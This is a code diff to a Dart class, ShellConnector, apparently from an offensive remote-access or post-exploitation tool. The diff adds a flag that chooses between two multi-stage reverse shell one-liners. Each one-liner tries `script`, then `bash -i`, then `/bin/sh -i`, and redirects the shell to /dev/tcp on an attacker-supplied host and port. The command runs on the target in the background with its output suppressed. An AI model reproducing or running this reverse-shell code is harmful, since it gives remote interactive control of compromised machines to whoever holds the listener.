@@ -43,25 +43,43 @@ abstract class ShellConnector {
 
   /// 尝试通过当前连接器在目标上启动反弹 Shell。
   ///
+  /// [preferScript] = true 时：
+  ///   - 优先使用 `script` 分配伪终端，其次是 bash，最后回退到 sh。
+  /// [preferScript] = false 时：
+  ///   - 仅使用 bash 或 /bin/sh，不再尝试 script。
+  ///
   /// 默认实现仅支持类 Unix 目标：通过 [executeCommand] 执行反弹命令。
-  /// 优先使用 `script` 分配伪终端，其次是 bash，最后回退到 sh。
   /// 具体连接器可根据协议/目标环境重写此方法（例如生成 Windows 版命令）。
-  Future<void> startReverseShell(String lhost, int lport) async {
+  Future<void> startReverseShell(
+    String lhost,
+    int lport, {
+    bool preferScript = true,
+  }) async {
     if (!supportsShellExec) {
       throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
     }
-    // 使用多级回退的一键反弹命令，并显式设置 TERM：
-    // 1. 先导出 TERM=xterm-256color，避免 clear 等命令报 “TERM not set”
-    // 2. 优先使用 script 分配伪终端 + bash
-    // 3. 其次使用 bash -i
-    // 4. 否则      → /bin/sh -i
-    final cmd =
-        "bash -c 'export TERM=xterm-256color; "
-        "if command -v script >/dev/null 2>&1; then "
-        "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
-        "elif command -v bash >/dev/null 2>&1; then "
-        "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
-        "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
+    late final String cmd;
+    if (preferScript) {
+      // 使用多级回退的一键反弹命令，并显式设置 TERM：
+      // 1. 先导出 TERM=xterm-256color，避免 clear 等命令报 “TERM not set”
+      // 2. 优先使用 script 分配伪终端 + bash
+      // 3. 其次使用 bash -i
+      // 4. 否则      → /bin/sh -i
+      cmd =
+          "bash -c 'export TERM=xterm-256color; "
+          "if command -v script >/dev/null 2>&1; then "
+          "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
+          "elif command -v bash >/dev/null 2>&1; then "
+          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
+          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
+    } else {
+      // 仅使用 bash -i /bin/sh -i，不再尝试 script
+      cmd =
+          "bash -c 'export TERM=xterm-256color; "
+          "if command -v bash >/dev/null 2>&1; then "
+          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
+          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
+    }
     await executeCommand('$cmd >/dev/null 2>&1 &', workingDir: currentDir);
   }
 }
